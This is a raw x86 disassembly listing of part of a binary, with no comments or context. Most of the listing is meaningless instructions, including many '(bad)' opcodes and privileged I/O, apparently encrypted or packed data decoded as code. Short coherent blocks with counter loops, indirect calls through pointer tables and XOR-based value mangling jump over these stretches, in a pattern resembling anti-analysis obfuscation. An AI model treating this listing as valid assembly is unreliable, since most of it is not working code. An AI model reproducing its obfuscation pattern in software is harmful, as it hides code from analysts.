  404ad5:	stos   DWORD PTR es:[edi],eax
  404ad6:	fstp   QWORD PTR ds:0xa06fb22e
  404adc:	pop    ebx
  404add:	xchg   esp,eax
  404ade:	push   ds
  404adf:	(bad)  
  404ae0:	loop   0x404b17
  404ae2:	jbe    0x404a69
  404ae4:	in     al,dx
  404ae5:	cmp    DWORD PTR [esi+0x5750c9e2],0x7f64d33b
  404aef:	scas   al,BYTE PTR es:[edi]
  404af0:	push   esp
  404af1:	mov    dh,0x19
  404af3:	imul   ebx,DWORD PTR [ecx-0x49],0x8f6500fe
  404afa:	lahf   
  404afb:	cmp    al,0x79
  404afd:	xchg   ebp,eax
  404afe:	dec    esp
  404aff:	les    eax,FWORD PTR [ecx+esi*1]
  404b02:	imul   ecx,ebx,0x16ce3043
  404b08:	out    dx,al
  404b09:	ror    DWORD PTR [esi-0x7efd49ff],1
  404b0f:	jp     0x404b10
  404b11:	xor    al,0x7d
  404b13:	sbb    dh,cl
  404b15:	(bad)  
  404b16:	(bad)  
  404b17:	cmp    al,0x1
  404b19:	sbb    ebp,ecx
  404b1b:	or     DWORD PTR [edi+ecx*2-0x40],0x65b03562
  404b23:	xor    DWORD PTR [ecx],0x64
  404b26:	fcom   QWORD PTR [esi+ecx*2+0x35]
  404b2a:	xor    al,0x15
  404b2c:	push   ds
  404b2d:	pop    ebp
  404b2e:	aam    0x86
  404b30:	ins    BYTE PTR es:[edi],dx
  404b31:	stos   DWORD PTR es:[edi],eax
  404b32:	xor    BYTE PTR gs:[esi+ebp*2],dl
  404b36:	xlat   BYTE PTR ds:[ebx]
  404b37:	ins    BYTE PTR es:[edi],dx
  404b38:	inc    edx
  404b39:	pop    ebp
  404b3a:	cwde   
  404b3b:	fs js  0x404ada
  404b3e:	mov    DWORD PTR [edi+eiz*4],ecx
  404b41:	or     eax,0xafe65bb0
  404b46:	(bad)  
  404b47:	jmp    0x404b3f
  404b49:	test   DWORD PTR [esi-0x75fc0ee9],ecx
  404b4f:	das    
  404b50:	int3   
  404b51:	mov    ds:0xdc5b2209,al
  404b56:	jbe    0x404bc9
  404b58:	bound  edi,QWORD PTR [ecx-0x19f08326]
  404b5e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404b5f:	cwde   
  404b60:	enter  0xd5fd,0x69
  404b64:	dec    eax
  404b65:	xchg   esp,eax
  404b66:	out    0xbe,eax
  404b68:	mov    ch,0x11
  404b6a:	dec    edx
  404b6b:	ins    BYTE PTR es:[edi],dx
  404b6c:	mov    al,0x6e
  404b6e:	pop    eax
  404b6f:	sahf   
  404b70:	das    
  404b71:	cmp    DWORD PTR [esp+esi*2+0x2],edi
  404b75:	frstor [edx+0x1b]
  404b78:	(bad)  
  404b79:	mov    cl,0x83
  404b7b:	dec    edi
  404b7c:	push   ebx
  404b7d:	mov    esi,0xc9bea80c
  404b82:	cmp    bh,BYTE PTR [ecx-0x1261b44e]
  404b88:	mov    ebp,DWORD PTR [esp+edx*2+0x46]
  404b8c:	and    ch,BYTE PTR [ebx+0x34]
  404b8f:	retf   0x8837
  404b92:	ja     0x404b40
  404b94:	lock or BYTE PTR [ebp+0x6a],bl
  404b98:	jbe    0x404bdf
  404b9a:	xchg   DWORD PTR [ebx],ebx
  404b9c:	push   0x69
  404b9e:	jecxz  0x404b26
  404ba0:	repz xchg ecx,eax
  404ba2:	sbb    DWORD PTR [ebp+0x42d18255],edx
  404ba8:	mov    ds:0x795b4bdf,eax
  404bad:	jnp    0x404bee
  404baf:	icebp  
  404bb0:	mov    WORD PTR [eax-0x447f9a35],gs
  404bb6:	call   0xf69e7613
  404bbb:	xor    cl,BYTE PTR [eax]
  404bbd:	fdivrp st(2),st
  404bbf:	imul   esp,edx,0x28
  404bc2:	jb     0x404bb0
  404bc4:	cmp    eax,0xbd07f655
  404bc9:	sar    DWORD PTR [ebp-0xd9cc405],0x94
  404bd0:	out    dx,al
  404bd1:	mov    ds:0x9b651c9e,eax
  404bd6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404bd7:	jo     0x404b70
  404bd9:	mov    edi,0x23e7556
  404bde:	push   edx
  404bdf:	pusha  
  404be0:	ror    ah,1
  404be2:	pop    eax
  404be3:	adc    eax,0xb0e1f6b7
  404be8:	push   DWORD PTR [edx+0x4f]
  404beb:	lahf   
  404bec:	sub    DWORD PTR [ebp-0x58],eax
  404bef:	sub    al,0x4b
  404bf1:	pop    ss
  404bf2:	pop    eax
  404bf3:	ss jmp 0x404bb6
  404bf6:	repnz mov esp,0x93ab6c94
  404bfc:	sar    DWORD PTR [eax],1
  404bfe:	inc    ebx
  404bff:	bound  edx,QWORD PTR [edx]
  404c01:	cmp    BYTE PTR [ebx+0x1a],dl
  404c04:	add    al,0x76
  404c06:	ins    BYTE PTR es:[edi],dx
  404c07:	push   ecx
  404c08:	and    DWORD PTR [edi+0xd],0xffffffa1
  404c0c:	inc    ebp
  404c0d:	adc    al,0x20
  404c0f:	jb     0x404c13
  404c11:	mov    ah,0x50
  404c13:	adc    al,0xa8
  404c15:	into   
  404c16:	(bad)  
  404c17:	xchg   ecx,eax
  404c18:	adc    BYTE PTR cs:[ecx],ah
  404c1b:	repnz out 0x4,eax
  404c1e:	rcr    BYTE PTR [ebp+ebx*2-0xa7371e],1
  404c25:	and    bl,bh
  404c27:	jmp    DWORD PTR [ebx+0x6a20b303]
  404c2d:	jecxz  0x404ca4
  404c2f:	shr    BYTE PTR fs:[edx-0x3c0665cb],0x99
  404c37:	fild   DWORD PTR [ecx]
  404c39:	push   ebx
  404c3a:	xor    BYTE PTR [esi-0x75],ch
  404c3d:	loop   0x404cb5
  404c3f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404c40:	test   BYTE PTR cs:[ebx+0x2648de2d],0xb5
  404c48:	sub    DWORD PTR [ebx-0x5d92d565],ecx
  404c4e:	xchg   BYTE PTR [ecx-0x78],al
  404c51:	shr    BYTE PTR [edi+ebx*1-0x3df8ff44],cl
  404c58:	cld    
  404c59:	je     0x404c5a
  404c5b:	and    DWORD PTR [edx],esp
  404c5d:	sbb    eax,0x71f3eeeb
  404c62:	inc    edi
  404c63:	mov    ds:0x7d088552,al
  404c68:	cmp    DWORD PTR [eax+0x5ff4565a],ecx
  404c6e:	inc    ebx
  404c6f:	cs iret 
  404c71:	pop    ebp
  404c72:	push   es
  404c73:	push   eax
  404c74:	fcom   QWORD PTR [eax]
  404c77:	lock mov DWORD PTR [ebx+0x7b],eax
  404c7b:	ret    
  404c7c:	in     al,dx
  404c7d:	test   eax,0xe188faea
  404c82:	addr16 jo 0x404ca0
  404c85:	xor    ecx,DWORD PTR [edx]
  404c87:	imul   edx,DWORD PTR [ebx+0x52109ae2],0x548754fa
  404c91:	xor    BYTE PTR [ebx-0x6c96cf03],bh
  404c97:	imul   BYTE PTR [ecx+eiz*1-0x5f]
  404c9b:	or     eax,0x4489e209
  404ca0:	mov    BYTE PTR [edi],cl
  404ca2:	test   BYTE PTR [eax-0x45932691],ch
  404ca8:	pop    ebx
  404ca9:	fmul   QWORD PTR [edi+0x1f]
  404cac:	dec    ecx
  404cad:	cdq    
  404cae:	test   BYTE PTR [ecx],ch
  404cb0:	xlat   BYTE PTR ds:[ebx]
  404cb1:	jo     0x404ce4
  404cb3:	jecxz  0x404c6d
  404cb5:	jge    0x404d10
  404cb7:	es enter 0x4f27,0x79
  404cbc:	lock cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404cbe:	test   eax,0x51717a1e
  404cc3:	mov    WORD PTR [eax+0x23],fs
  404cc6:	sbb    dh,BYTE PTR [edi]
  404cc8:	mov    ds:0x5ad44f5e,al
  404ccd:	test   BYTE PTR [edi],bl
  404ccf:	retf   
  404cd0:	imul   edx,DWORD PTR [eax-0x79],0x459d9aa8
  404cd7:	sbb    BYTE PTR [esi],ch
  404cd9:	arpl   WORD PTR [esp+ecx*4+0x66642efd],cx
  404ce0:	retf   0xd7be
  404ce3:	sbb    al,0x69
  404ce5:	dec    edx
  404ce6:	cmp    edi,DWORD PTR [ebp+0x2a2c270f]
  404cec:	shr    DWORD PTR [esi+eiz*4-0x80],cl
  404cf0:	dec    esi
  404cf1:	aaa    
  404cf2:	push   ebx
  404cf3:	adc    al,0x5b
  404cf5:	inc    edx
  404cf6:	and    DWORD PTR [esi+0x6e],ecx
  404cf9:	bndstx [esi],bnd0
  404cfc:	ja     0x404cc6
  404cfe:	pop    ebp
  404cff:	call   0xf6c9:0x1ca1445f
  404d06:	mov    dl,BYTE PTR [ebx]
  404d08:	mov    eax,ds:0xdef830f9
  404d0d:	dec    ebp
  404d0e:	push   ebx
  404d0f:	dec    eax
  404d10:	popf   
  404d11:	(bad)
  404d15:	fild   QWORD PTR [edx-0x3d156bc0]
  404d1b:	jo     0x404ca9
  404d1d:	push   ss
  404d1e:	lods   al,BYTE PTR ds:[esi]
  404d1f:	xor    edi,DWORD PTR [ecx+0x5ba239bf]
  404d25:	sub    edi,DWORD PTR [eax]
  404d27:	loope  0x404da2
  404d29:	jbe    0x404cb7
  404d2b:	jmp    0x16df:0xb7b98de8
  404d32:	adc    DWORD PTR [edx],edi
  404d34:	or     bl,ch
  404d36:	div    ecx
  404d38:	mov    ecx,DWORD PTR [ebp+0x10]
  404d3b:	and    ecx,eax
  404d3d:	or     ecx,0x81161d8f
  404d43:	mov    eax,ecx
  404d45:	pop    ebp
  404d46:	ret    0x18
  404d49:	push   ebp
  404d4a:	mov    ebp,esp
  404d4c:	jmp    0x404f59
  404d51:	pop    ds
  404d52:	iret   
  404d53:	xchg   edi,eax
  404d54:	cmp    DWORD PTR [edi+0x41],esi
  404d57:	jno    0x404d42
  404d59:	das    
  404d5a:	ins    BYTE PTR es:[edi],dx
  404d5b:	xchg   esp,eax
  404d5c:	mov    eax,0x81d37a2e
  404d61:	out    0x20,al
  404d63:	jle    0x404de3
  404d65:	outs   dx,BYTE PTR ds:[esi]
  404d66:	jg     0x404de6
  404d68:	jle    0x404d3f
  404d6a:	test   al,0x93
  404d6c:	(bad)  
  404d6d:	cwde   
  404d6e:	push   cs
  404d6f:	mov    ebx,0x5a1aac6f
  404d74:	mov    ebp,0xe038651c
  404d79:	imul   edx,DWORD PTR [edx+0x2a054b37],0x9f018613
  404d83:	jle    0x404d6f
  404d85:	out    dx,al
  404d86:	fld    DWORD PTR [esi-0xa]
  404d89:	fld1   
  404d8b:	xor    DWORD PTR [esi+0x5b1435d6],edx
  404d91:	inc    eax
  404d92:	dec    edx
  404d93:	icebp  
  404d94:	or     edi,ebx
  404d96:	mov    ebx,0x7a500b91
  404d9b:	ret    
  404d9c:	sub    ecx,ebx
  404d9e:	adc    eax,0x3bc395c1
  404da3:	les    ebx,FWORD PTR [eax-0x1e]
  404da6:	fdivrp st(0),st
  404da8:	cmp    eax,0xfa00ce79
  404dad:	jl     0x404d85
  404daf:	xchg   BYTE PTR [ecx-0x13],al
  404db2:	inc    ebp
  404db3:	xor    BYTE PTR [edi],dl
  404db5:	int3   
  404db6:	cmp    eax,0x7e2b72e3
  404dbb:	cli    
  404dbc:	js     0x404e1e
  404dbe:	push   eax
  404dbf:	and    DWORD PTR [edx],edi
  404dc1:	fwait
  404dc2:	rcl    DWORD PTR [eax],0x6c
  404dc5:	(bad)  
  404dc7:	and    bl,BYTE PTR [ecx-0xbf310ee]
  404dcd:	jnp    0x404d60
  404dcf:	jge    0x404db7
  404dd1:	cmp    al,0x74
  404dd3:	add    eax,edx
  404dd5:	xlat   BYTE PTR ds:[ebx]
  404dd6:	jp     0x404e02
  404dd8:	imul   ebp,esp,0x88b59b45
  404dde:	call   0x34f949a
  404de3:	rcr    esp,0xaf
  404de6:	fild   WORD PTR [ebx+0x6efec6d]
  404dec:	mov    ebx,0x95149562
  404df1:	js     0x404e12
  404df3:	cmp    DWORD PTR [edx],0x8fea3f04
  404df9:	out    0xe5,al
  404dfb:	scas   eax,DWORD PTR es:[edi]
  404dfc:	push   edx
  404dfd:	mov    al,ds:0x12fbc934
  404e02:	dec    esp
  404e03:	mov    ch,0x95
  404e05:	xchg   edx,eax
  404e06:	and    BYTE PTR [edi+edi*1-0x710e9540],cl
  404e0d:	mov    esi,0x30b6f4d5
  404e12:	(bad)  
  404e13:	aad    0xd3
  404e15:	xor    DWORD PTR [edi],ebp
  404e17:	mov    edx,0xa5dc09f9
  404e1c:	adc    edi,DWORD PTR [eax+0x67]
  404e1f:	gs push es
  404e21:	adc    al,0x9b
  404e23:	test   DWORD PTR [ebx+esi*4],0x355e1fd
  404e2a:	data16 jae 0x404df9
  404e2d:	gs pop es
  404e2f:	mov    edx,0xbac3ca7b
  404e34:	mov    ecx,0x5f13f5d2
  404e39:	mov    bl,ch
  404e3b:	sbb    ah,BYTE PTR [ebx+0x4f]
  404e3e:	xchg   BYTE PTR [ebx-0x1da74d1a],cl
  404e44:	(bad)  
  404e45:	xchg   esp,eax
  404e46:	cld    
  404e47:	jle    0x404ea7
  404e49:	cmc    
  404e4a:	adc    eax,0xafcbded3
  404e4f:	jp     0x404e95
  404e51:	(bad)  
  404e53:	gs mov edi,0x4e21ca85
  404e59:	lods   al,BYTE PTR ds:[esi]
  404e5a:	loopne 0x404eb5
  404e5c:	mov    dh,0xa1
  404e5e:	(bad)  
  404e5f:	fwait
  404e60:	add    ebx,eax
  404e62:	push   ebx
  404e63:	pop    ebx
  404e64:	jmp    0xa006e10c
  404e69:	imul   esp,DWORD PTR [ebx],0x1d
  404e6c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404e6d:	push   ebp
  404e6e:	lds    esi,FWORD PTR [ebx+0x7a]
  404e71:	es mov dh,0xf9
  404e74:	xchg   ecx,eax
  404e75:	shr    al,1
  404e77:	jmp    0xe163f46
  404e7c:	aaa    
  404e7d:	cmp    al,0x19
  404e7f:	scas   al,BYTE PTR es:[edi]
  404e80:	je     0x404eb7
  404e82:	retf   
  404e83:	xor    edx,DWORD PTR [edx-0x5]
  404e86:	call   0x33dc7de2
  404e8b:	and    BYTE PTR [ecx-0x6e80578c],0x95
  404e92:	sbb    eax,0x2d548127
  404e97:	xor    dh,BYTE PTR [eax+0x66b83017]
  404e9d:	shl    DWORD PTR [edx+edi*1],cl
  404ea0:	(bad)  
  404ea1:	mov    al,ds:0xb7f86809
  404ea6:	push   eax
  404ea7:	int    0xcc
  404ea9:	xor    al,0xda
  404eab:	arpl   sp,dx
  404ead:	fild   QWORD PTR [ebp+ebx*4-0x41930044]
  404eb4:	or     dl,BYTE PTR ds:0xc17b1a6a
  404eba:	(bad)  
  404ebc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404ebd:	or     DWORD PTR [ecx+eax*4-0x18],0xffffffdd
  404ec2:	in     al,dx
  404ec3:	pop    edx
  404ec4:	mov    eax,0xf64a9dba
  404ec9:	scas   eax,DWORD PTR es:[edi]
  404eca:	sbb    eax,DWORD PTR [ecx-0x2225fbac]
  404ed0:	jns    0x404eda
  404ed2:	ins    BYTE PTR es:[edi],dx
  404ed3:	shl    eax,cl
  404ed5:	and    DWORD PTR [bx+di],0x3a
  404ed9:	dec    ebp
  404eda:	dec    ebp
  404edb:	aaa    
  404edc:	cmp    eax,0xc4a04633
  404ee1:	sub    DWORD PTR [ebx+edi*4+0x5e],0x9110891c
  404ee9:	mov    esp,0xf02dc4b9
  404eee:	ins    BYTE PTR es:[edi],dx
  404eef:	cmp    eax,0xe13ada28
  404ef4:	mov    BYTE PTR [ebp-0x7fe55002],cl
  404efa:	sub    eax,0xdfa9d666
  404eff:	gs xchg ebp,eax
  404f01:	xchg   edx,eax
  404f02:	lods   eax,DWORD PTR ds:[esi]
  404f03:	and    ebx,ecx
  404f05:	add    al,0x1e
  404f07:	(bad)  
  404f08:	or     cl,BYTE PTR [ecx-0x2936dc42]
  404f0e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404f0f:	into   
  404f10:	fnstenv [ebx+esi*8]
  404f13:	loop   0x404f0f
  404f15:	call   0x783a2c6
  404f1a:	xor    BYTE PTR [edi+eiz*8-0x61],0x75
  404f1f:	enter  0x7f66,0x25
  404f23:	xlat   BYTE PTR ds:[ebx]
  404f24:	xchg   DWORD PTR [edi+0x18524873],eax
  404f2a:	hlt    
  404f2b:	inc    esp
  404f2c:	xchg   esi,eax
  404f2d:	jne    0x404f2f
  404f2f:	mov    edi,0x493024a9
  404f34:	and    DWORD PTR gs:[edi-0xf879e5f],ebx
  404f3b:	mov    dl,0x97
  404f3d:	call   0x4256e629
  404f42:	lods   eax,DWORD PTR ds:[esi]
  404f43:	push   eax
  404f44:	nop
  404f45:	fdivr  QWORD PTR [ebp-0x43]
  404f48:	mov    ?,WORD PTR cs:[edi+0x44]
  404f4c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404f4d:	jb     0x404f6c
  404f4f:	fsub   DWORD PTR [ebp+eiz*4-0x76]
  404f53:	xchg   DWORD PTR [ebx],eax
  404f55:	bound  eax,QWORD PTR [esi]
  404f57:	jp     0x404f46
  404f59:	push   ecx
  404f5a:	and    DWORD PTR ds:0x4302d9,0x0
  404f64:	jmp    0x404f74
  404f69:	mov    eax,ds:0x4302d9
  404f6e:	inc    eax
  404f6f:	mov    ds:0x4302d9,eax
  404f74:	cmp    DWORD PTR ds:0x4302d9,0x15
  404f7b:	jae    0x404fbb
  404f81:	cmp    DWORD PTR ds:0x4302d9,0x17
  404f88:	jne    0x404fa4
  404f8e:	push   0x42e654
  404f93:	push   DWORD PTR [ebp-0x10]
  404f96:	push   0x32cc
  404f9b:	push   DWORD PTR [ebp-0x24]
  404f9e:	call   DWORD PTR ds:0x42e91f
  404fa4:	jmp    0x404f69
  404fa9:	mov    edx,DWORD PTR ds:0x42ec57
  404faf:	xor    edx,DWORD PTR ds:0x4302d1
  404fb5:	mov    DWORD PTR ds:0x42ec57,edx
  404fbb:	mov    DWORD PTR [ebp-0x4],0xf89c853d
  404fc2:	mov    edx,DWORD PTR ds:0x42ece9
  404fc8:	mov    eax,ds:0x42e803
  404fcd:	sub    eax,edx
  404fcf:	and    edx,DWORD PTR [edx+eax*1]
  404fd2:	mov    eax,DWORD PTR [ebp-0x4]
  404fd5:	movzx  ecx,WORD PTR ds:0x42e658
  404fdc:	sub    ecx,DWORD PTR ds:0x4302cd
  404fe2:	mov    DWORD PTR ds:0x42e658,ecx
  404fe8:	mov    edx,DWORD PTR [ebp+0x10]
  404feb:	and    DWORD PTR ds:0x42ec73,0x0
  404ff5:	mov    ecx,DWORD PTR ds:0x42ec73
  404ffb:	inc    ecx
  404ffc:	mov    DWORD PTR ds:0x42ec73,ecx
  405002:	cmp    DWORD PTR ds:0x42ec73,0x7
  405009:	jne    0x405018
  40500f:	push   DWORD PTR [ebp-0x28]
  405012:	call   DWORD PTR ds:0x42e853
  405018:	cmp    DWORD PTR ds:0x42ec73,0x6
  40501f:	jne    0x405034
  405025:	xor    ecx,ecx
  405027:	or     ecx,DWORD PTR ds:0x42ec73
  40502d:	inc    ecx
  40502e:	mov    DWORD PTR ds:0x42ec73,ecx
  405034:	cmp    DWORD PTR ds:0x42ec73,0x1e
  40503b:	jb     0x404ff5
  405041:	jmp    0x40524e
  405046:	inc    eax
  405047:	jo     0x405063
  405049:	xor    BYTE PTR [edx],ch
  40504b:	jo     0x40509d
  40504d:	jo     0x40502d
  40504f:	shl    BYTE PTR [eax],1
  405051:	outs   dx,BYTE PTR ds:[esi]
  405052:	jbe    0x4050a5
  405054:	sbb    eax,0x7e2ed6c1
  405059:	jle    0x4050c9
  40505b:	jg     0x4050db
  40505d:	jle    0x405092
  40505f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405060:	js     0x405011
  405062:	mov    DWORD PTR ds:0x4fb18a67,ebp
  405068:	jae    0x405099
  40506a:	call   0xb0214b3
  40506f:	pop    ss
  405070:	inc    esi
  405071:	dec    edi
  405072:	ror    esi,cl
  405074:	push   esi
  405075:	jns    0x40500f
  405077:	setbe  BYTE PTR [eax]
  40507a:	test   esp,esi
  40507c:	loopne 0x40504a
  40507e:	cli    
  40507f:	aam    0x7b
  405081:	xchg   ebp,eax
  405082:	xor    bl,ah
  405084:	xor    eax,0x2b417edc
  405089:	cwde   
  40508a:	ja     0x4050c5
  40508c:	fidiv  WORD PTR [edx+edx*1]
  40508f:	mov    dh,0x47
  405091:	push   edi
  405092:	push   es
  405093:	iret   
  405094:	inc    edi
  405095:	imul   edx,esi,0x2
  405098:	sub    DWORD PTR [eax-0x7b],ecx
  40509b:	mov    dl,0x37
  40509d:	outs   dx,DWORD PTR cs:[esi]
  40509f:	xor    BYTE PTR [eax],0xc1
  4050a2:	das    
  4050a3:	inc    edi
  4050a4:	aas    
  4050a5:	mov    ah,cl
  4050a7:	push   ecx
  4050a8:	aas    
  4050a9:	in     eax,dx
  4050aa:	aaa    
  4050ab:	mov    dh,0xd5
  4050ad:	stos   BYTE PTR es:[edi],al
  4050ae:	xor    ebp,DWORD PTR [ecx-0x5e693f72]
  4050b4:	fnsave [ecx]
  4050b6:	into   
  4050b7:	mov    ss,WORD PTR [eax-0x606a67a]
  4050bd:	sub    al,0xf
  4050bf:	and    BYTE PTR [eax],ah
  4050c1:	mov    dl,0x6b
  4050c3:	lea    ecx,[ebp-0x49]
  4050c6:	and    bl,cl
  4050c8:	jge    0x405134
  4050ca:	adc    esi,DWORD PTR [ecx+0x2c6abfdb]
  4050d0:	jb     0x4050c4
  4050d2:	adc    al,0x77
  4050d4:	xchg   ecx,eax
  4050d5:	dec    ebp
  4050d6:	jnp    0x4050d6
  4050d8:	enter  0x7035,0x17
  4050dc:	xor    ah,cl
  4050de:	and    DWORD PTR [ecx-0x6],esp
  4050e1:	mov    dl,0x1f
  4050e3:	inc    esp
  4050e4:	add    al,0x8d
  4050e6:	pop    ebp
  4050e7:	push   ebp
  4050e8:	add    dl,al
  4050ea:	ins    DWORD PTR es:[edi],dx
  4050eb:	enter  0xb1b2,0xb1
  4050ef:	add    dh,BYTE PTR [ebx+0x1e]
  4050f2:	fisttp WORD PTR [edi-0x79]
  4050f5:	shl    edx,cl
  4050f7:	mov    ah,0x1c
  4050f9:	das    
  4050fa:	xchg   esp,eax
  4050fb:	add    al,0xcf
  4050fd:	test   eax,0x82aa60ac
  405102:	(bad)  
  405103:	pop    ss
  405104:	jge    0x4050bc
  405106:	std    
  405107:	lods   eax,DWORD PTR ds:[esi]
  405108:	mov    ebp,0xb3e0355d
  40510d:	nop
  40510e:	test   DWORD PTR [edx+eiz*1],esp
  405111:	xor    DWORD PTR [esi+0x5669e2a6],0x31
  405118:	jno    0x405132
  40511a:	mov    ebx,0x75439e8
  40511f:	les    ebx,FWORD PTR [esi]
  405121:	imul   esi,DWORD PTR [esi],0xffffffef
  405124:	jb     0x4050ce
  405126:	add    cl,bh
  405128:	xor    BYTE PTR [ebx+0x392cba0a],dh
  40512e:	xchg   BYTE PTR ds:0x3095ac32,dh
  405134:	mov    al,ds:0x4b0355e6
  405139:	cs je  0x4051a5
  40513c:	es nop
  40513e:	pop    eax
  40513f:	xor    al,0x10
  405141:	sbb    esp,DWORD PTR [edi+0x27]
  405144:	les    ecx,FWORD PTR [esi-0x36]
  405147:	in     eax,0xbe
  405149:	push   eax
  40514a:	jg     0x4050dc
  40514c:	push   ebx
  40514d:	cmp    bh,BYTE PTR [esi-0x34]
  405150:	(bad)  
  405151:	sub    edx,DWORD PTR [edi-0x62]
  405154:	stc    
  405155:	push   edi
  405156:	push   ebx
  405157:	hlt    
  405158:	out    0x96,eax
  40515a:	jns    0x405170
  40515c:	and    DWORD PTR [edx],ecx
  40515e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40515f:	loop   0x4051be
  405161:	add    bl,bl
  405163:	shl    DWORD PTR [ecx],cl
  405165:	aas    
  405166:	pop    ecx
  405167:	fbstp  TBYTE PTR [ebx]
  405169:	pop    ss
  40516a:	bound  esi,QWORD PTR [eax+ecx*8-0x731fd07c]
  405171:	fnstsw WORD PTR [ebp+eax*1+0x3b]
  405175:	push   ebx
  405176:	nop
  405177:	mov    dh,BYTE PTR [esi+eax*2]
  40517a:	call   0x313a058b
  40517f:	pop    ecx
  405180:	pop    eax
  405181:	repz int 0x4
  405184:	lahf   
  405185:	sub    cl,dl
  405187:	mov    ah,ch
  405189:	enter  0x7770,0x23
  40518d:	rcr    BYTE PTR [esp+ecx*2-0x29],1
  405191:	loopne 0x4051fa
  405193:	stos   BYTE PTR es:[edi],al
  405194:	xor    al,0x7d
  405196:	or     eax,0xd991fd99
  40519b:	push   cs
  40519c:	and    edi,DWORD PTR [eax]
  40519e:	and    DWORD PTR [esi-0x1a093937],0xef9b2aef
  4051a8:	add    al,0xe8
  4051aa:	and    ebx,ecx
  4051ac:	mov    dh,0x5b
  4051ae:	test   eax,0x714b666d
  4051b3:	cmp    edi,edx
  4051b5:	cmp    eax,0x93b863ed
  4051ba:	icebp  
  4051bb:	aas    
  4051bc:	cmp    BYTE PTR [ebx],bh
  4051be:	inc    ebx
  4051bf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4051c0:	fwait
  4051c1:	xchg   ecx,eax
  4051c2:	enter  0xcb3d,0x31
  4051c6:	stos   DWORD PTR es:[edi],eax
  4051c7:	add    cl,BYTE PTR [ecx+0x5a2aad0]
  4051cd:	xchg   ebx,eax
  4051ce:	mov    cl,0xed
  4051d0:	cmp    si,dx
  4051d3:	cmps   DWORD PTR es:[esi],DWORD PTR es:[edi]
  4051d5:	shr    BYTE PTR [ebp+0x31],cl
  4051d8:	and    al,BYTE PTR [ebx+0x677fd56e]
  4051de:	sbb    BYTE PTR [esp+ecx*2+0x51],0x93
  4051e3:	aam    0x37
  4051e5:	mov    ebp,0x17efc67f
  4051ea:	xchg   ebx,eax
  4051ec:	mov    WORD PTR [ebx-0x1dd0337e],?
  4051f2:	gs mov bl,0x32
  4051f5:	test   al,0xe
  4051f7:	mov    ah,0xd4
  4051f9:	cmp    ch,BYTE PTR [ecx]
  4051fb:	faddp  st(2),st
  4051fd:	xlat   BYTE PTR ds:[ebx]
  4051fe:	sub    esp,DWORD PTR [ecx+0x66]
  405201:	xchg   ecx,eax
  405202:	adc    DWORD PTR [ecx-0xe],ebp
  405205:	fidiv  WORD PTR [ecx+0x70485ded]
  40520b:	fsubp  st(4),st
  40520d:	sbb    DWORD PTR [edi+0x945b75c],ecx
  405213:	push   es
  405214:	dec    ecx
  405215:	adc    DWORD PTR [ebx+eax*2],esi
  405218:	popa   
  405219:	icebp  
  40521a:	jne    0x40529b
  40521c:	push   ebx
  40521d:	sar    DWORD PTR [esi-0x20],1
  405220:	cmc    
  405221:	retf   
  405222:	out    0xff,al
  405224:	xlat   BYTE PTR ds:[ebx]
  405225:	arpl   WORD PTR [ecx-0x68f842b3],sp
  40522b:	mov    ah,0xdf
  40522d:	imul   ebx,DWORD PTR [ebp+0x5a73cbd1],0xffffff85
  405234:	repz sub esi,DWORD PTR [esi]
  405237:	xor    BYTE PTR [ecx-0x1cab0725],bh
  40523d:	or     BYTE PTR [edx+0x143b13be],bl
  405243:	arpl   WORD PTR [edi-0x48],si
  405246:	sub    DWORD PTR [eax-0x306d0b2c],eax
  40524c:	jle    0x405207
  40524e:	mov    ecx,0x7510854
  405253:	xor    eax,ecx
  405255:	add    eax,0x32729b
  40525a:	mov    DWORD PTR [edx],eax
  40525c:	mov    eax,DWORD PTR [ebp+0x14]
  40525f:	mov    edx,DWORD PTR [ebp+0x10]
  405262:	mov    DWORD PTR [edx+0x4],eax
  405265:	mov    eax,DWORD PTR [ebp+0x18]
  405268:	mov    edx,DWORD PTR [ebp+0x10]
  40526b:	jmp    0x405478
  405270:	sar    DWORD PTR [edx+ebp*4],cl
  405273:	push   ebp
  405274:	mov    cl,0x71
  405276:	icebp  
  405277:	mov    eax,0xd68c6305
  40527c:	sahf   
  40527d:	stc    
  40527e:	jmp    0x7e6d18e9
  405283:	jle    0x4052f3
  405285:	jg     0x405305
  405287:	jle    0x40524a
  405289:	cmp    BYTE PTR [ebp+0x400610f8],ch
  40528f:	push   ds
  405290:	pushf  
  405291:	push   ebp
  405292:	js     0x40521d
  405294:	out    0xa8,al
  405296:	lods   eax,DWORD PTR ds:[esi]
  405297:	ins    DWORD PTR es:[edi],dx
  405298:	sbb    eax,0x453d4885
  40529d:	jb     0x405318
  40529f:	lods   al,BYTE PTR ds:[esi]
  4052a0:	aam    0x9b
  4052a2:	push   esp
  4052a3:	cwde   
  4052a4:	test   DWORD PTR [ecx],0x56248639
  4052aa:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4052ab:	mov    ss,WORD PTR [ebx+0x2b9fc408]
  4052b1:	xchg   ebp,eax
  4052b2:	cld    
  4052b3:	or     al,0xd8
  4052b5:	nop
  4052b6:	xchg   ecx,eax
  4052b7:	mov    ah,0xb
  4052b9:	iret   
  4052ba:	lahf   
  4052bb:	xor    DWORD PTR [ebx],esi
  4052bd:	dec    edi
  4052be:	in     eax,0x1c
  4052c0:	jbe    0x405310
  4052c2:	adc    DWORD PTR [esi+0x3d],ebp
  4052c5:	cs (bad) 
  4052c8:	cmc    
  4052c9:	into   
  4052ca:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4052cb:	fwait
  4052cc:	sar    edx,cl
  4052ce:	loope  0x4052c2
  4052d0:	add    ebp,DWORD PTR [ecx+0xea38eda]
  4052d6:	ss cmp ebx,0xfffffff3
  4052da:	xchg   ebx,eax
  4052db:	mov    edx,0xf7b2fe25
  4052e0:	lea    esi,[edi+0x10]
  4052e3:	icebp  
  4052e4:	mov    eax,ds:0x442e7e92
  4052e9:	push   ds
  4052ea:	loop   0x40527c
